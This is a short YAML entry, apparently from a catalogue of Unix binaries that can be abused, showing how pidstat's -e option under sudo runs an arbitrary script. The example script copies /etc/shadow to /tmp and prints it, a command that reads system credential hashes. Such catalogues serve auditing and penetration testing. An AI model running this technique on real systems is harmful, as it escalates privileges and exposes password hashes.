---
description: "The pidstat command is used for monitoring individual tasks currently being managed by the Linux kernel. With -e option it is possible to execute programs."
functions:
  sudo:
    - code: |
        echo 'cat /etc/shadow > /tmp/x' > /tmp/cmd.sh
        chmod +x /tmp/cmd.sh
        sudo /usr/bin/pidstat -e /tmp/cmd.sh
        cat /tmp/x
---